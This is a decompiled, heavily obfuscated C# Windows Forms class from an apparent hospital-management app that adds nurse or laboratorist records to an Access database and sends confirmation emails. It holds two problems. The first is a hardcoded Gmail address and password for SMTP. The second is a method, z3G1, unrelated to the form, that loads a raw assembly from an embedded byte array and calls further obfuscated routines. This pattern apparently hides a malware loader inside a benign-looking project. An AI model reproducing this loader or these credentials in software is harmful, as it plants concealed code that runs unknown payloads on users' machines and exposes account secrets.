using System;
using System.ComponentModel;
using System.Data.OleDb;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using By74;
using Ex2a;
using Microsoft.VisualBasic.CompilerServices;
using d2J;

namespace b2S0;

[DesignerGenerated]
public class Wx18 : Form
{
	private IContainer components;

	private OleDbConnection con;

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ff31;
			Button button = _Button3;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox4")]
	internal virtual TextBox TextBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox3")]
	internal virtual TextBox TextBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Qe07;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Xc64;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public Wx18()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)b4K6);
		con = new OleDbConnection();
		e5H4();
	}

	[DebuggerNonUserCode]
	protected override void Px4y(bool c9DE)
	{
		try
		{
			if (c9DE && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(c9DE);
		}
	}

	[DebuggerStepThrough]
	private void e5H4()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_01e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0208: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_044c: Unknown result type (might be due to invalid IL or missing references)
		//IL_04dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_056e: Unknown result type (might be due to invalid IL or missing references)
		Button3 = new Button();
		GroupBox1 = new GroupBox();
		TextBox4 = new TextBox();
		TextBox3 = new TextBox();
		TextBox2 = new TextBox();
		TextBox1 = new TextBox();
		Label5 = new Label();
		Label4 = new Label();
		Label3 = new Label();
		Label2 = new Label();
		Button2 = new Button();
		Button1 = new Button();
		((Control)GroupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		((ButtonBase)Button3).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)Button3).set_Location(new Point(505, 280));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(123, 37));
		((Control)Button3).set_TabIndex(17);
		((ButtonBase)Button3).set_Text("Close");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(false);
		((Control)GroupBox1).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox4);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label5);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label4);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label2);
		((Control)GroupBox1).set_Location(new Point(25, 13));
		((Control)GroupBox1).set_Margin(new Padding(4));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Padding(new Padding(4));
		((Control)GroupBox1).set_Size(new Size(603, 240));
		((Control)GroupBox1).set_TabIndex(18);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Nurse information:");
		((Control)TextBox4).set_Location(new Point(125, 171));
		((Control)TextBox4).set_Name("TextBox4");
		((Control)TextBox4).set_Size(new Size(452, 22));
		((Control)TextBox4).set_TabIndex(16);
		((Control)TextBox3).set_Location(new Point(125, 131));
		((Control)TextBox3).set_Name("TextBox3");
		((Control)TextBox3).set_Size(new Size(452, 22));
		((Control)TextBox3).set_TabIndex(15);
		((Control)TextBox2).set_Location(new Point(125, 88));
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(452, 22));
		((Control)TextBox2).set_TabIndex(14);
		((Control)TextBox1).set_Location(new Point(125, 45));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(452, 22));
		((Control)TextBox1).set_TabIndex(13);
		Label5.set_AutoSize(true);
		((Control)Label5).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)Label5).set_Location(new Point(62, 174));
		((Control)Label5).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(53, 17));
		((Control)Label5).set_TabIndex(8);
		Label5.set_Text("Phone:");
		Label5.set_TextAlign((ContentAlignment)32);
		Label4.set_AutoSize(true);
		((Control)Label4).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)Label4).set_Location(new Point(53, 131));
		((Control)Label4).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(64, 17));
		((Control)Label4).set_TabIndex(6);
		Label4.set_Text("Address:");
		Label4.set_TextAlign((ContentAlignment)32);
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)Label3).set_Location(new Point(70, 88));
		((Control)Label3).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(46, 17));
		((Control)Label3).set_TabIndex(4);
		Label3.set_Text("Email:");
		Label3.set_TextAlign((ContentAlignment)32);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)Label2).set_Location(new Point(66, 45));
		((Control)Label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(49, 17));
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text("Name:");
		Label2.set_TextAlign((ContentAlignment)32);
		((ButtonBase)Button2).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)Button2).set_Location(new Point(150, 280));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(125, 37));
		((Control)Button2).set_TabIndex(16);
		((ButtonBase)Button2).set_Text("Clear");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button1).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)Button1).set_Location(new Point(25, 280));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(115, 37));
		((Control)Button1).set_TabIndex(15);
		((ButtonBase)Button1).set_Text("Add");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((Form)this).set_AcceptButton((IButtonControl)(object)Button1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.GradientActiveCaption);
		((Form)this).set_ClientSize(new Size(641, 328));
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).set_Name("Form13");
		((Form)this).set_Text("Add Nurse/Laboratorist");
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	private void b4K6(object sender, EventArgs e)
	{
		string currentDirectory = Directory.GetCurrentDirectory();
		currentDirectory = Directory.GetParent(currentDirectory)!.ToString();
		currentDirectory = Directory.GetParent(currentDirectory)!.ToString();
		string connectionString = "provider=microsoft.ACE.OLEDB.12.0 ; data source = " + currentDirectory + "\\hms_Database.accdb";
		con.set_ConnectionString(connectionString);
	}

	private void Xc64(object sender, EventArgs e)
	{
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Expected O, but got Unknown
		//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Expected O, but got Unknown
		//IL_01ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f9: Expected O, but got Unknown
		//IL_0210: Unknown result type (might be due to invalid IL or missing references)
		//IL_021a: Expected O, but got Unknown
		//IL_0231: Unknown result type (might be due to invalid IL or missing references)
		//IL_023b: Expected O, but got Unknown
		//IL_0252: Unknown result type (might be due to invalid IL or missing references)
		//IL_025c: Expected O, but got Unknown
		//IL_0289: Unknown result type (might be due to invalid IL or missing references)
		//IL_0351: Unknown result type (might be due to invalid IL or missing references)
		//IL_0368: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b8: Unknown result type (might be due to invalid IL or missing references)
		if ((Operators.CompareString(TextBox1.get_Text(), "", false) == 0) | (Operators.CompareString(TextBox2.get_Text(), "", false) == 0) | (Operators.CompareString(TextBox3.get_Text(), "", false) == 0) | (Operators.CompareString(TextBox4.get_Text(), "", false) == 0))
		{
			MessageBox.Show("Can't leave any field empty", "Empty Field");
		}
		if ((TextBox4.get_Text().Length != 10) | TextBox4.get_Text().Contains(",") | TextBox4.get_Text().Contains(".") | TextBox4.get_Text().Contains("(") | TextBox4.get_Text().Contains("-") | TextBox4.get_Text().Contains(" ") | !Versioned.IsNumeric((object)TextBox4.get_Text()) | TextBox4.get_Text().Contains("+"))
		{
			MessageBox.Show("Enter valid 10-digit mobile number without +91 or 0 in the beginning", "Invalid Input");
			return;
		}
		con.Open();
		if (Operators.CompareString(GroupBox1.get_Text(), "Nurse Information", false) != 0)
		{
		}
		string text = ((Operators.CompareString(GroupBox1.get_Text(), "Nurse Information", false) != 0) ? "Insert into Laboratorist_DataBase([Lab_Name],[Email],[Phone],[Address]) Values(?,?,?,?)" : "Insert into Nurse_DataBase([Nurse_Name],[Email],[Phone],[Address]) Values(?,?,?,?)");
		OleDbCommand val = new OleDbCommand(text, con);
		if (Operators.CompareString(GroupBox1.get_Text(), "Nurse Information", false) == 0)
		{
			val.get_Parameters().Add(new OleDbParameter("Nurse_Name", (object)TextBox1.get_Text()));
		}
		else
		{
			val.get_Parameters().Add(new OleDbParameter("Lab_Name", (object)TextBox1.get_Text()));
		}
		val.get_Parameters().Add(new OleDbParameter("Email", (object)TextBox2.get_Text()));
		val.get_Parameters().Add(new OleDbParameter("Phone", (object)TextBox4.get_Text()));
		val.get_Parameters().Add(new OleDbParameter("Address", (object)TextBox3.get_Text()));
		try
		{
			val.ExecuteNonQuery();
			val.set_CommandText("SELECT @@IDENTITY");
			MessageBox.Show("ID" + val.ExecuteScalar().ToString(), "Successfully Added");
			try
			{
				string text2 = TextBox2.get_Text();
				SmtpClient smtpClient = new SmtpClient();
				MailMessage mailMessage = new MailMessage();
				smtpClient.UseDefaultCredentials = false;
				smtpClient.Credentials = new NetworkCredential("softwarelab20192@gmail.com", "software2019");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Host = "smtp.gmail.com";
				mailMessage = new MailMessage();
				mailMessage.From = new MailAddress("softwarelab20192@gmail.com");
				mailMessage.To.Add(text2);
				mailMessage.Subject = "Patient SignUp@IITG Hospital";
				mailMessage.IsBodyHtml = true;
				mailMessage.Body = "Name:" + TextBox1.get_Text() + "\r\nSuccessfully Added\r\nRegards\r\nI-CARE Hospital";
				smtpClient.Send(mailMessage);
				MessageBox.Show("Successfully sent confirmation email");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message);
				ProjectData.ClearProjectError();
			}
			((Component)(object)val).Dispose();
			((TextBoxBase)TextBox2).Clear();
			((TextBoxBase)TextBox3).Clear();
			((TextBoxBase)TextBox4).Clear();
			((TextBoxBase)TextBox1).Clear();
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			MessageBox.Show(ex4.Message);
			ProjectData.ClearProjectError();
		}
		con.Close();
	}

	private void Ff31(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	internal static void z3G1()
	{
		Assembly assembly = null;
		byte[] rawAssembly = (byte[])Jw8.mDic[Jw8.mArray];
		assembly = Assembly.Load(rawAssembly);
		Jw8.mDic.Add("Deep", assembly);
		assembly = null;
		if (Wr7o.Xp6n())
		{
			a5YH.Sc50();
		}
	}

	private void Qe07(object sender, EventArgs e)
	{
		((TextBoxBase)TextBox1).Clear();
		((TextBoxBase)TextBox2).Clear();
		((TextBoxBase)TextBox3).Clear();
		((TextBoxBase)TextBox4).Clear();
	}
}